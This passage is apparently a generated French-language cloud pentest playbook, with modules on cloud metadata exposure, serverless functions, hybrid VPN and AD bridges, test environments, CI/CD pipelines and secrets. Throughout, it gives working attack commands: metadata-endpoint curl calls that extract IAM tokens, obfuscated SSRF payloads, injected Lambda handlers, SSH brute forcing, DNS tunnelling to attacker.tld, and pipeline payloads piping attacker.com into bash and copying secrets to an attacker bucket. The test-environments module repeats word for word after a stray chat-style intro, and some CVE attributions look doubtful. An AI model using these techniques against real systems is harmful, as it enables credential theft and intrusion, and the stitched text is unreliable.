| T1526             | Cloud Service Discovery| Enum fonctions & builds         |
| T1557             | Man-in-the-Middle    | Traffic via sandbox proxy        |

---

## 🧪 PHASE 5 — AUTOMATION / SCRIPTS

```bash
sandbox_enum.sh       # Lister services, dump runtime
sandbox_escape_test.sh # Inject RCE, test write/tmp
sandbox_metadata_abuse.sh # Access tokens IAM
azure_function_escape.ps1 # Escalade via FunctionProxy

lambda_layer_escape.py  # Upload layer + trigger
ci_cd_rce_injection.py  # Inject buildspec.yaml ou script étape
```

---

## 📂 OUTPUT STRUCTURE

```plaintext
/output/cloud/sandbox/<target>/enum_services.log
/output/cloud/sandbox/<target>/metadata_dump.txt
/output/cloud/sandbox/<target>/escape_confirmed.flag
/output/cloud/sandbox/<target>/tmp_injection_payload.sh
/output/cloud/sandbox/<target>/ci_cd_artifact_exploit.log
```

---

## 🧠 `engine_cloud_metadata_exposure()`

### 🔥 OBJECTIF :
Exploitation des métadonnées cloud accessibles depuis des workloads, containers, fonctions serverless, ou VMs mal configurées. Accès non restreint à la **metadata API** permet extraction de jetons IAM, credentials temporaires, rôles, secrets, endpoints internes.

---

## 🧬 TYPE_ABSTRAIT : `MetadataContext`

```plaintext
MetadataContext {
  cloud: AWS | Azure | GCP,
  endpoint: string,
  method: GET | PUT | POST,
  header_required: boolean,
  headers: [string],
  accessible_from: container | lambda | vm | public ip,
  sensitive_keys: [AccessKeyId, SecretAccessKey, Tokens],
  linked_services: [EC2, IAM, GKE, Azure MSI, etc.],
  vulnerable: boolean,
  exposure_path: SSRF | LocalAccess | InsecureContainer
}
```

---

## 🧪 PHASE 1 — DÉTECTION DE L’ENDPOINT METADATA

### 🔍 Reconnaissance manuelle & automatisée :
```bash
# Test général (Linux)
curl http://169.254.169.254/ -i

# AWS Specific (IMDSv2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
 -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure MSI
curl 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
 -H "Metadata: true"

# GCP Metadata
curl "http://metadata.google.internal/computeMetadata/v1/" \
 -H "Metadata-Flavor: Google"
```

---

## 🚪 PHASE 2 — TECHNIQUES D’EXPOSITION

| Tactique            | Description                                                      |
|---------------------|------------------------------------------------------------------|
| SSRF → Metadata      | Server Side Request Forgery redirige vers IP 169.254.169.254     |
| Container Misconfig | Container mal configuré → accès direct                          |
| Web App Injection   | Injection dans code de fonction lambda (eval, exec...)          |
| Proxy Exposure      | Forward proxy sans restriction d’IP                              |
| WAF bypass          | Payloads obfusqués vers endpoint metadata                        |

---

## 🎯 EXEMPLES D’EXPLOITATION SSRF

```bash
# SSRF classique
http://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Obfuscation IP
http://vuln.com/?q=http://[0xA9FEA9FE]/
http://vuln.com/?q=http://0251.0376.0251.0376/
```

---

## 🛠 OUTILS DE PENTEST

| Outil           | Fonction                                                     |
|------------------|--------------------------------------------------------------|
| `imds_enum.sh`   | Script automatique d’enum metadata                          |
| `curl`           | Test direct via CLI                                          |
| `ffuf`           | Bruteforce endpoints internes                                |
| `SSRFmap`        | Payloads SSRF → Metadata API                                 |
| `pacu`           | AWS post-exploitation IAM key injection                      |
| `GCPBucketBrute` | Accès à storage via metadata abuse                           |

---

## 🔐 PHASE 3 — EXTRACTION DE CREDENTIALS

### 🧪 AWS :
```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
 http://169.254.169.254/latest/meta-data/iam/security-credentials/

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

### 🧪 Azure :
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/' \
 -H Metadata:true
```

### 🧪 GCP :
```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
 -H "Metadata-Flavor: Google"
```

---

## 🗝 PHASE 4 — UTILISATION DES SECRETS EXFILTRÉS

```bash
# AWS - reconversion des clés
aws sts get-caller-identity --profile compromised

# GCP - liste des projets
gcloud auth activate-service-account --key-file=creds.json
gcloud projects list

# Azure - exploitation via Az CLI
az login --identity
az account show
```

---

## ⚔️ MAPPING ATT&CK / CVE

| MITRE ATT&CK ID   | Technique                              |
|-------------------|----------------------------------------|
| T1526             | Cloud Service Discovery                |
| T1078             | Valid Accounts (via metadata abuse)    |
| T1213.001         | Data from Cloud Storage Object         |
| T1552.001         | Credentials in Metadata                |

| CVE               | Description                            |
|------------------|----------------------------------------|
| CVE-2020-8559     | Kubernetes SSRF → Metadata             |
| CVE-2019-12384    | Deserialization → RCE → Metadata access|
| CVE-2019-11248    | GKE metadata access via proxy          |

---

## 🧰 SCRIPTING & AUTOMATION

```bash
metadata_enum.sh         # Check endpoints
ssrf_payload_gen.py      # Gen obfusqués SSRF metadata
aws_creds_reuse.sh       # Configure .aws/credentials
gcp_metadata_loot.sh     # Token + storage access
azure_msi_hijack.sh      # MSI token abuse

```

---

## 📁 OUTPUTS STRUCTURE

```plaintext
/output/cloud/metadata_exposure/<target>/metadata_dump.txt
/output/cloud/metadata_exposure/<target>/ssrf_payloads_used.txt
/output/cloud/metadata_exposure/<target>/credentials_extracted.json
/output/cloud/metadata_exposure/<target>/impact_scenario.md
```

---

## ☁️ `engine_cloud_serverless()`

### 🧠 OBJECTIF :
Pentester des environnements **Serverless** (FaaS) dans les plateformes cloud.  
Détection des vulnérabilités liées à la configuration, aux dépendances tierces, aux vecteurs internes comme les permissions IAM, l’accès à l’API metadata, les secrets mal protégés, ou le code non filtré.

---

## 🧬 TYPE_ABSTRAIT : `ServerlessContext`

```plaintext
ServerlessContext {
  cloud_provider: AWS | Azure | GCP,
  function_name: string,
  runtime: Node.js | Python | Java | Go | .NET,
  triggers: [HTTP | S3 | EventBridge | PubSub],
  permission_scope: [IAMRole],
  network: Public | VPC-bound,
  environment_vars: [string],
  secrets_attached: boolean,
  vulnerable_dependencies: [CVE[]],
  entry_points: [handler(), wrapper()],
  logging_mode: CloudWatch | Stackdriver | ApplicationInsights
}
```

---

## 📌 PHASE 1 — ENUMÉRATION DES FONCTIONS

### 🔍 AWS :
```bash
aws lambda list-functions
aws lambda get-function --function-name <name>
```

### 🔍 Azure :
```bash
az functionapp list
az functionapp function show --name <func-name>
```

### 🔍 GCP :
```bash
gcloud functions list
gcloud functions describe <function-name>
```

---

## 🧪 PHASE 2 — ATTACK SURFACES

| Vecteur                  | Description                                       |
|--------------------------|---------------------------------------------------|
| Entry Point Injection    | Code injection dans handler()                    |
| Unfiltered HTTP Trigger  | RCE / Path Traversal / SSRF / Unrestricted input |
| LFI / RFI via event body | Inclusion de fichiers                             |
| Envars Abuse             | Secrets exposés dans process.env                 |
| Metadata Abuse           | Appelle API 169.254.169.254                      |
| SSRF vers APIs internes  | Via URL injection                                |
| Exploit Runtimes         | Node.js child_process, Python os.system          |
| 3rd Party CVE            | CVE-affected packages exploités à l’appel        |

---

## 🧠 PHASE 3 — OUTILS D’EXPLOITATION SERVERLESS

| Outil           | Usage offensif                                     |
|------------------|----------------------------------------------------|
| `wafw00f`         | Analyse du proxy/Gateway/API devant la fonction   |
| `Lambdaguard`     | Audit de configuration des fonctions AWS Lambda   |
| `Cloudsplaining`  | Analyse des rôles IAM des fonctions               |
| `Kics`, `Trivy`   | Audit des dépendances CVE                         |
| `SSRFmap`         | Injection SSRF pour échapper au proxy             |
| `Faast.js`        | Testing exploit runtime via Node/Python           |
| `Pacu`            | Extraction de secrets liés à la fonction (AWS)    |

---

## 💣 PHASE 4 — INJECTION RUNTIME

### Node.js (AWS Lambda) :
```javascript
const { execSync } = require('child_process');
exports.handler = async (event) => {
  const output = execSync("curl http://169.254.169.254/latest/meta-data/");
  return output.toString();
}
```

### Python :
```python
import os
def handler(event, context):
    return os.popen("ls -la /tmp").read()
```

---

## 🔥 PHASE 5 — ABUS IAM / SECRETS / API Metadata

### Dump ENV Variables :
```bash
printenv | grep AWS
printenv | grep SECRET
```

### Appelle API Metadata :
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 🎯 MAPPING MITRE ATT&CK / CVE

| MITRE ATT&CK Tactic | Technique                            |
|----------------------|--------------------------------------|
| T1071.001            | Application Layer Protocol: Web      |
| T1210                | Exploitation of Remote Services      |
| T1059.006            | Command and Scripting: NodeJS        |
| T1552.003            | Credentials in Environment Variables |
| T1069.002            | Cloud Group Enumeration              |

| CVE                    | Description                                         |
|------------------------|-----------------------------------------------------|
| CVE-2023-27575          | AWS Lambda template injection via CloudFormation   |
| CVE-2021-41117          | SSRF via GCP HTTP Trigger                          |
| CVE-2022-2990           | RCE in Python runtime + vulnerable lib             |
| CVE-2022-29464          | File upload RCE (WebShell in FaaS Gateway)         |

---

## 🛠 SCRIPTS :

```bash
lambda_enum.sh           # List AWS Lambda functions + IAM context
azurefunc_enum.sh        # Azure enumeration
gcp_func_enum.sh         # GCP enumeration + extraction
serverless_injector.py   # PoC RCE in Node.js/Python Lambda
env_dump.sh              # Extract ENV + secrets
```

---

## 🗃 OUTPUT STRUCTURE :

```plaintext
/output/cloud/serverless/<target>/enum_results.json
/output/cloud/serverless/<target>/env_vars.txt
/output/cloud/serverless/<target>/exploit_payloads.js
/output/cloud/serverless/<target>/metadata_token.json
/output/cloud/serverless/<target>/rce_success_flag.txt
```

---

## 🧬 `engine_cloud_hybrid_bridge()`

### 🎯 OBJECTIF :
Identifier et exploiter tous les ponts entre infrastructure Cloud et environnements internes ou tiers.  
Il s'agit de **bypasser les barrières réseau, IAM, DNS, API, ou tunnels VPN/Direct Connect**, **exfiltrer des données**, **pivoter vers des ressources internes**, ou **abuser des mauvaises intégrations cross-environnement**.

---

## 📦 TYPE_ABSTRAIT : `HybridBridgeContext`

```plaintext
HybridBridgeContext {
  provider: AWS | Azure | GCP,
  vpn_type: IPSec | SSL | DirectConnect | ExpressRoute,
  proxy_type: Squid | ZScaler | Custom,
  ad_connector: Enabled | Disabled,
  bastion_hosts: [string],
  public_endpoints: [IP/CIDR],
  internal_services: [DNS | AD | DB | FileShare],
  tunnel_active: boolean,
  access_logs: [CloudTrail | VPC Flow Logs | NSG],
  known CVEs: [CVE[]],
  mitre_map: [TTP[]]
}
```

---

## 🔎 PHASE 1 — DÉTECTION DE PASSERELLES HYBRIDES

| Étape                      | Outils / Commandes |
|----------------------------|--------------------|
| Enum VPN Gateway           | `aws ec2 describe-vpn-connections`, `az network vpn-gateway` |
| Enum AD Connectors         | `aws ds describe-directories` |
| Check Bastion Host Config  | `aws ec2 describe-instances --filters Bastion` |
| Network Peering / Routing  | `aws ec2 describe-route-tables`, `gcloud compute networks peerings list` |
| DNS Pivot / Resolver Leak  | `dig`, `nslookup`, `dnschef`, `dnsrecon` |

---

## 🔓 PHASE 2 — ABUS DES CONNEXIONS

### 🎯 VPN IPSEC / DirectConnect / ExpressRoute

- Rebond via bastion :  
  `ssh -J bastion@<public> user@<internal>`
- Scan depuis proxy public :  
  `proxychains nmap -sT <internal>`
- Interception si VPN SSL mal sécurisé :  
  `openvpn --config leaked.ovpn`
- Dumping routes injectées (AWS):  
  `ip route`, `traceroute`, `ss -tulnp`

---

## 🔥 PHASE 3 — ABUS AD CONNECTOR / HYBRID JOIN

| Étape                      | Exploits / TTP               |
|----------------------------|------------------------------|
| ADConnect Weak Credentials | CVE-2021-42278 / 42287 → impersonation |
| NTLM Relay → GCP Metadata  | SMB → SSRF via AD proxy      |
| Token reuse / MFA bypass   | Reuse AzureAD tokens (Graph) |

---

## 🧠 PHASE 4 — SSRF CROSS-ZONE / DNS TUNNELING

- SSRF to Internal Cloud API (GCP/AWS metadata) :
```bash
curl -x <proxy> http://169.254.169.254/latest/meta-data/
```

- DNS Exfiltration :
```bash
curl -H "Host: secret.data.attacker.tld" internal.corp
dig @internal.ns target.corp TXT +short
```

- Tunnel DNS :
```bash
iodine -f attacker.tld
```

---

## 🧪 PHASE 5 — OUTILS RECOMMANDÉS

| Outil              | Usage stratégique                           |
|--------------------|----------------------------------------------|
| `pacu`             | Audit AWS bridge misconfig, AD abuse         |
| `bloodhound-python` | Détection hybrid AD over VPN                |
| `mitm6 + ntlmrelayx`| Pivot entre AD Cloud & infra on-prem        |
| `responder`        | SMB/LLMNR abuse pour passer les firewalls    |
| `cloudmapper`      | Visualisation des interconnexions réseau     |
| `openvpn`, `strongswan` | Détection de tunnels actifs ou vulnérables |

---

## 🔍 PHASE 6 — MAPPING CVE & MITRE

| CVE                         | Impact                            |
|-----------------------------|------------------------------------|
| CVE-2021-42278              | sAMAccountName spoof (AD Hybrid)   |
| CVE-2021-42287              | Admin impersonation + ADConnect    |
| CVE-2022-26923              | ADCS abuse via connector           |
| CVE-2019-0708 (BlueKeep)    | RDP public exposé par peering      |

| MITRE ATT&CK                | Technique                         |
|-----------------------------|------------------------------------|
| T1046                      | Network Service Scanning           |
| T1041                      | Exfiltration over Command Channel |
| T1086                      | PowerShell abuse (via VPN AD)      |
| T1567                      | Exfil over Web or DNS              |
| T1190                      | Exploit Public Facing App          |

---

## 🧰 PHASE 7 — SCRIPTS DÉDIÉS

```bash
hybrid_enum.sh             # Enum VPN/Peering/Connectors
dnsleak_check.sh           # DNS tunneling test + exfil test
adconnector_exploit.ps1    # Abuse Azure AD Connect config
bastion_pivot.sh           # SSH + scan depuis bastion
proxy_mitm.sh              # Redirection + exploit SSRF
```

---

## 🗂 OUTPUTS STRUCTURÉS

```plaintext
/output/cloud/hybrid/<target>/vpn_routes.txt
/output/cloud/hybrid/<target>/ad_abuse_results.log
/output/cloud/hybrid/<target>/dns_tunnel_dump.pcap
/output/cloud/hybrid/<target>/pivot_graph.dot
/output/cloud/hybrid/<target>/ssrf_metadata_results.txt
```

---

## 🧪 `engine_cloud_test_envs()`

### 🎯 OBJECTIF :

Identifier, cartographier, et exploiter les **environnements de test**, **de staging**, de **préproduction** ou de **sandbox** exposés accidentellement sur Internet ou au sein du Cloud Provider.  
Cibler les **API non protégées**, **comptes partagés**, **données sensibles** non masquées, **mauvaise isolation**, et **réutilisation de secrets/permissions** de prod vers des environnements tiers.

---

## 🧬 TYPE_ABSTRAIT : `TestEnvContext`

```plaintext
TestEnvContext {
  provider: AWS | Azure | GCP,
  resource_type: EC2 | Lambda | AKS | CloudRun | Container | Storage | API Gateway,
  env_tag: string,              // test | dev | staging | preprod | sandbox
  naming_pattern: string,       // test-*, dev-*, staging-*
  network_scope: Public | VPC,
  authentication_type: IAM | Hardcoded | None,
  shared_with_prod: boolean,
  secrets_present: boolean,
  exposed_ports: [int],
  known_vulnerabilities: [CVE],
  endpoint: URL,
  detection_source: DNS | Tag | Scan | Asset Inventory
}
```

---

## 🔎 PHASE 1 — IDENTIFICATION DYNAMIQUE DES ENVIRONNEMENTS

### 🔍 Stratégies de détection :

| Méthode                      | Détails |
|------------------------------|---------|
| **Tag scanning**             | Tags comme `env=test`, `staging`, `dev` dans EC2, S3, GCP |
| **Nom de ressource**         | Patterns `*-test`, `dev-`, `sandbox-`, etc. |
| **DNS recon**                | Sous-domaines `test.`, `dev.`, `sandbox.`, etc. |
| **Cloud Inventory**          | `aws config`, `gcloud asset inventory`, `az resource list` |
| **IP exposée + Banner**      | Via `nmap`, `shodan`, `amass`, `eyewitness` |

---

## ⚠️ PHASE 2 — EXPLOITATION DES SURFACES DE TEST

| Surface                    | Exemples réels                       | Tactique offensive                             |
|----------------------------|--------------------------------------|------------------------------------------------|
| API Gateway (test)         | Swagger non auth                     | SSRF, RCE via test endpoints                   |
| Lambda dev / functions     | Déployées sans auth, `dev_user`      | RCE avec `os.system`, `exec()`                |
| VM / Container dev         | Pas de firewall, SSH ouvert          | Brute-force, upload, LPE via dev_tool         |
| Storage dev                | Buckets test publics                 | Dump de données non masquées                  |
| Sandbox SaaS intégré       | App tiers exposées (Jupyter, Jenkins)| Token reuse, hijack de session, WebShell      |
| GitLab-CI, Jenkins test    | Job history avec secrets             | Replay et exfiltration                        |

---

## 💣 PHASE 3 — OUTILS & TECHNIQUES D’ATTAQUE

| Outil                   | Usage                                        |
|--------------------------|---------------------------------------------|
| `amass`, `subfinder`     | Enum DNS + sous-domaines test/dev/staging   |
| `nuclei`                 | Templates `test`, `swagger`, `dev-login`    |
| `fuzzapi`, `ffuf`, `qsreplace` | Injection & fuzzing d’API de staging  |
| `aws-nuke`, `s3scanner`  | Détection de S3 test non sécurisés          |
| `eyewitness`, `aquatone` | Screenshots des interfaces accessibles      |
| `jwt_tool`, `token-hound`| Vérification des tokens dev/staging         |

---

## 🧠 PHASE 4 — TACTIQUES AVANCÉES

### SSRF / RCE dans sandbox API :
```bash
POST /test/api/v1/data HTTP/1.1
Host: test.api.company.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

### Brute-force Dev Credentials :
```bash
hydra -l admin -P dev-pass.txt test.env.company.com ssh
```

### Abuse de permissions partagées :
```bash
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name TestDevLambdaRole
```

---

## 🧬 PHASE 5 — MAPPING MITRE & CVE

| MITRE ATT&CK ID | Tactique / Technique                            |
|------------------|-------------------------------------------------|
| T1078.004        | Cloud Account Credentials                      |
| T1210            | Exploitation of Remote Services (e.g. Jenkins) |
| T1087            | Account Discovery (from dev envs)              |
| T1040            | Network Sniffing (on dev proxy / container)    |
| T1556            | Abuse of Dev Auth System (CI/CD token reuse)   |

| CVE                        | Description                                      |
|----------------------------|--------------------------------------------------|
| CVE-2022-0185              | Linux kernel container escape in dev pods        |
| CVE-2022-22965             | Spring4Shell — souvent déployé dans staging API |
| CVE-2021-21234             | Jenkins dev plugins vulnérables à RCE           |
| CVE-2023-23914             | Misuse of dev S3 bucket policies                 |

---

## ⚙️ PHASE 6 — SCRIPTS CLI

```bash
testenv_scan.sh               # Enum & fingerprint DNS / S3 / API Gateway
swagger_injector.py          # SSRF / RCE PoC sur API test
bucket_ripper.sh             # Scan public buckets dev*
token_dump_dev.sh            # Dump secrets via test endpoints
jenkins_enum_dev.sh          # CVE exploit des jobs Jenkins test
```

---

## 🗂 OUTPUT ORGANISÉ

```plaintext
/output/cloud/test_envs/<target>/exposed_dns.txt
/output/cloud/test_envs/<target>/buckets_public.json
/output/cloud/test_envs/<target>/api_poison.log
/output/cloud/test_envs/<target>/dev_tokens.txt
/output/cloud/test_envs/<target>/jenkins_exploit_trace.md
```

---

Voici le **GIGA MODULE `engine_cloud_test_envs()`**, conçu avec le **même niveau de profondeur heuristique et stratégique** que les modules précédents, structuré en Markdown, avec une **logique algorithmique dynamique**, une **orchestration conditionnelle des patterns**, une **analyse croisée MITRE ↔ CVE ↔ CPE**, et des **scripts automatisés d’exploitation et de remédiation** pour cibler les **environnements de test, staging et sandbox** souvent négligés mais critiques dans les clouds modernes (AWS, Azure, GCP…).

---

## 🧪 `engine_cloud_test_envs()`

### 🎯 OBJECTIF :

Identifier, cartographier, et exploiter les **environnements de test**, **de staging**, de **préproduction** ou de **sandbox** exposés accidentellement sur Internet ou au sein du Cloud Provider.  
Cibler les **API non protégées**, **comptes partagés**, **données sensibles** non masquées, **mauvaise isolation**, et **réutilisation de secrets/permissions** de prod vers des environnements tiers.

---

## 🧬 TYPE_ABSTRAIT : `TestEnvContext`

```plaintext
TestEnvContext {
  provider: AWS | Azure | GCP,
  resource_type: EC2 | Lambda | AKS | CloudRun | Container | Storage | API Gateway,
  env_tag: string,              // test | dev | staging | preprod | sandbox
  naming_pattern: string,       // test-*, dev-*, staging-*
  network_scope: Public | VPC,
  authentication_type: IAM | Hardcoded | None,
  shared_with_prod: boolean,
  secrets_present: boolean,
  exposed_ports: [int],
  known_vulnerabilities: [CVE],
  endpoint: URL,
  detection_source: DNS | Tag | Scan | Asset Inventory
}
```

---

## 🔎 PHASE 1 — IDENTIFICATION DYNAMIQUE DES ENVIRONNEMENTS

### 🔍 Stratégies de détection :

| Méthode                      | Détails |
|------------------------------|---------|
| **Tag scanning**             | Tags comme `env=test`, `staging`, `dev` dans EC2, S3, GCP |
| **Nom de ressource**         | Patterns `*-test`, `dev-`, `sandbox-`, etc. |
| **DNS recon**                | Sous-domaines `test.`, `dev.`, `sandbox.`, etc. |
| **Cloud Inventory**          | `aws config`, `gcloud asset inventory`, `az resource list` |
| **IP exposée + Banner**      | Via `nmap`, `shodan`, `amass`, `eyewitness` |

---

## ⚠️ PHASE 2 — EXPLOITATION DES SURFACES DE TEST

| Surface                    | Exemples réels                       | Tactique offensive                             |
|----------------------------|--------------------------------------|------------------------------------------------|
| API Gateway (test)         | Swagger non auth                     | SSRF, RCE via test endpoints                   |
| Lambda dev / functions     | Déployées sans auth, `dev_user`      | RCE avec `os.system`, `exec()`                |
| VM / Container dev         | Pas de firewall, SSH ouvert          | Brute-force, upload, LPE via dev_tool         |
| Storage dev                | Buckets test publics                 | Dump de données non masquées                  |
| Sandbox SaaS intégré       | App tiers exposées (Jupyter, Jenkins)| Token reuse, hijack de session, WebShell      |
| GitLab-CI, Jenkins test    | Job history avec secrets             | Replay et exfiltration                        |

---

## 💣 PHASE 3 — OUTILS & TECHNIQUES D’ATTAQUE

| Outil                   | Usage                                        |
|--------------------------|---------------------------------------------|
| `amass`, `subfinder`     | Enum DNS + sous-domaines test/dev/staging   |
| `nuclei`                 | Templates `test`, `swagger`, `dev-login`    |
| `fuzzapi`, `ffuf`, `qsreplace` | Injection & fuzzing d’API de staging  |
| `aws-nuke`, `s3scanner`  | Détection de S3 test non sécurisés          |
| `eyewitness`, `aquatone` | Screenshots des interfaces accessibles      |
| `jwt_tool`, `token-hound`| Vérification des tokens dev/staging         |

---

## 🧠 PHASE 4 — TACTIQUES AVANCÉES

### SSRF / RCE dans sandbox API :
```bash
POST /test/api/v1/data HTTP/1.1
Host: test.api.company.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

### Brute-force Dev Credentials :
```bash
hydra -l admin -P dev-pass.txt test.env.company.com ssh
```

### Abuse de permissions partagées :
```bash
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name TestDevLambdaRole
```

---

## 🧬 PHASE 5 — MAPPING MITRE & CVE

| MITRE ATT&CK ID | Tactique / Technique                            |
|------------------|-------------------------------------------------|
| T1078.004        | Cloud Account Credentials                      |
| T1210            | Exploitation of Remote Services (e.g. Jenkins) |
| T1087            | Account Discovery (from dev envs)              |
| T1040            | Network Sniffing (on dev proxy / container)    |
| T1556            | Abuse of Dev Auth System (CI/CD token reuse)   |

| CVE                        | Description                                      |
|----------------------------|--------------------------------------------------|
| CVE-2022-0185              | Linux kernel container escape in dev pods        |
| CVE-2022-22965             | Spring4Shell — souvent déployé dans staging API |
| CVE-2021-21234             | Jenkins dev plugins vulnérables à RCE           |
| CVE-2023-23914             | Misuse of dev S3 bucket policies                 |

---

## ⚙️ PHASE 6 — SCRIPTS CLI

```bash
testenv_scan.sh               # Enum & fingerprint DNS / S3 / API Gateway
swagger_injector.py          # SSRF / RCE PoC sur API test
bucket_ripper.sh             # Scan public buckets dev*
token_dump_dev.sh            # Dump secrets via test endpoints
jenkins_enum_dev.sh          # CVE exploit des jobs Jenkins test
```

---

## 🗂 OUTPUT ORGANISÉ

```plaintext
/output/cloud/test_envs/<target>/exposed_dns.txt
/output/cloud/test_envs/<target>/buckets_public.json
/output/cloud/test_envs/<target>/api_poison.log
/output/cloud/test_envs/<target>/dev_tokens.txt
/output/cloud/test_envs/<target>/jenkins_exploit_trace.md
```

---

## ⚙️ `engine_cloud_ci_cd_pipelines()`

### 🎯 OBJECTIF :
Détecter, auditer, et exploiter les chaînes CI/CD dans les environnements cloud, incluant les **services managés (CodeBuild, Azure Pipelines, Cloud Build)** ou **self-hosted (Jenkins, GitLab CI, Drone.io, etc.)**, en visant :

- Secrets mal gérés
- Pipelines publics ou déclenchables
- Dépendances vulnérables
- Injections de jobs
- Reuse de tokens sur des services liés (cloud, Git, devops)

---

### 🧬 TYPE_ABSTRAIT : `CICDContext`

```plaintext
CICDContext {
  provider: AWS | Azure | GCP | GitHub | GitLab | Jenkins,
  platform: GitHubActions | GitLabCI | CodePipeline | AzurePipelines | Jenkins | CircleCI,
  project_id: string,
  repo_url: string,
  job_visibility: Public | Private,
  token_type: PAT | OAuth | AWS_STS,
  secrets: [SecretKey],
  triggers: [Webhook | Push | Merge | API],
  scripts_injected: boolean,
  runners: [Container | VM | Cloud-Hosted],
  scope: Dev | Prod | Staging
}
```

---

## 🔎 PHASE 1 — DÉTECTION DES PIPELINES CI/CD

| Méthode de détection | Outils & techniques |
|----------------------|---------------------|
| Repos publics        | GitHub dorks : `filename:.github/workflows` |
| GitLab/GitHub GraphQL| Dump projets, runners, repos |
| Jenkins exposed port | `nmap --script http-jenkins` / `aquatone` |
| Buckets & S3 leaks   | Recherche `.gitlab-ci.yml`, `.circleci/config.yml` |
| DNS / Git metadata   | `gitrob`, `trufflehog`, `gitleaks` |

---

## 💣 PHASE 2 — EXPLOITATION TACTIQUE DES CHAÎNES CI/CD

### 🧪 CI/CD par provider

| Plateforme       | Vulnérabilités cibles                                                  |
|------------------|-------------------------------------------------------------------------|
| **GitHub Actions** | Secrets exposés dans les workflows, forks mal protégés, reusable workflows |
| **GitLab CI/CD**   | Trigger API non auth, runners persos non isolés                        |
| **Jenkins**        | Scripting RCE via build steps, plugins vulnérables (`Scriptler`, `Groovy`) |
| **Azure Pipelines**| Escalade via Library Variables, bypass des gates                      |
| **CircleCI**       | Leaks de tokens dans artefacts                                         |
| **AWS CodeBuild**  | Buildspec avec injection de commandes dans `phases.build.commands`    |

---

### 📦 TECHNIQUES D’INJECTION DANS LES PIPELINES

| Payload              | Exemple                                                           |
|----------------------|--------------------------------------------------------------------|
| Reverse shell        | `curl attacker.com | bash` dans buildspec.yml                     |
| Dump secrets         | `env > secrets.txt && aws s3 cp secrets.txt s3://attacker-bucket/` |
| Supply chain attack  | Modification d’une dépendance Git                                  |
| CVE exploit (plugin) | Jenkins CVE-2019-1003000 — Groovy injection                        |

---

### 🔐 SECRETS MANAGEMENT ABUSE

| Méthode                  | Exemples                                            |
|--------------------------|-----------------------------------------------------|
| GitLab → CI/CD variables | `printenv` dans script → secrets exposés           |
| GitHub → GITHUB_TOKEN    | Used to access other GitHub APIs → abuse possible   |
| Jenkins credentials store| Dump via Groovy script ou API REST                  |
| AWS → IAM Role injection| `aws sts get-caller-identity` dans pipeline         |

---

## 🛠 TOOLS SPÉCIFIQUES PENTEST CI/CD

| Outil             | Utilisation principale                             |
|------------------|----------------------------------------------------|
| `gitlabEnum`     | Enum projets, runners, APIs                        |
| `CIHunter`       | Detection pipelines vulnérables publics            |
| `whispers`       | Detection de secrets dans pipelines                |
| `gittyleaks`     | Dump secrets depuis l’historique Git               |
| `JenkinsScanner` | Jenkins vulnérabilités, enumeration, exploit       |
| `trufflehog`     | Deep secrets scan dans pipelines et repo          |
| `gitleaks`       | Analyse statique des fuites                        |

---

## 🧠 PHASE 3 — MAPPING HEURISTIQUE & DÉCISIONS

### 🔄 Conditionnel

```pseudo
IF pipeline_public AND secrets_in_job:
    → Trigger secrets_exfiltration.sh
    → Generate CVSS vector (Confidentiality=High)
    → Scan tokens with TokenHound

IF repo_has_workflow AND PR_from_fork_allowed:
    → Trigger workflow_injection_attack()

IF Jenkins_API_exposed:
    → Trigger RCE_Groovy_Exploit()

IF self-hosted_runner_scope=prod:
    → Trigger lateral_move_dev_to_prod()

ELSE:
    → Generate reconnaissance_only_report()
```

---

## 📁 OUTPUTS & STRUCTURE

```plaintext
/output/cloud/cicd/<project>/workflow_secrets.txt
/output/cloud/cicd/<project>/build_logs_exploited.log
/output/cloud/cicd/<project>/reverse_shell_trace.md
/output/cloud/cicd/<project>/tokens_reused.txt
/output/cloud/cicd/<project>/mitre_map.md
```

---

## 🧷 MAPPINGS MITRE ATT&CK

| Tactique | ID | Détail |
|----------|----|--------|
| Initial Access | T1078.004 | Use of dev tokens from pipelines |
| Execution | T1059.005 | CI/CD Script Execution |
| Lateral Movement | T1550.003 | Token reuse into production |
| Persistence | T1505.003 | Jenkins plugin persistence |
| Collection | T1005 | Dump artifacts & logs |
| Exfiltration | T1041 | Upload to S3/GDrive via pipeline |

---

## 🧷 `engine_cloud_secret_management()`

### 🎯 OBJECTIF :

Exploiter les mauvaises pratiques de **gestion des secrets** (identifiants, tokens, clés API, certificats, mots de passe) dans des environnements Cloud hybrides. Le module cible :

- Secrets exposés dans le code source
- Secrets dans variables d’environnement de fonctions (Lambda, GCF…)
- Mauvaise configuration des systèmes de gestion (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault)
- Secrets dans des buckets publics ou des artefacts de build
- Reuse de secrets dev/staging → prod

---

## 🧬 TYPE_ABSTRAIT : `SecretContext`

```plaintext
SecretContext {
  provider: AWS | Azure | GCP,
  origin: SourceCode | EnvVar | SecretManager | Pipeline | MetadataAPI | Bucket | ConfigFile,
  severity: Low | Medium | High | Critical,
  exposure: Public | Restricted | Private,
  credentials: [CredentialType],
  linked_to_prod: boolean,
  rotated: boolean,
  vault_type: SecretsManager | KeyVault | SecretManagerGCP | Hashicorp | CustomEnv,
  audit_detected: boolean,
  cve_links: [CVE]
}
```

---

## 🔍 PHASE 1 — RECONNAISSANCE & ENUMÉRATION DES SOURCES

| Source | Méthodes & Outils |
|--------|-------------------|
| **Code source (repos)** | `gitleaks`, `trufflehog`, `repo-supervisor`, GitHub dorks |
| **Variables d’env.** | `aws lambda get-function`, `gcloud functions describe`, `az functionapp config` |
| **Pipelines CI/CD** | `gitlabEnum`, `CIHunter`, `env | grep TOKEN` |
| **Metadata APIs** | `curl http://169.254.169.254/` sur EC2/GCE |
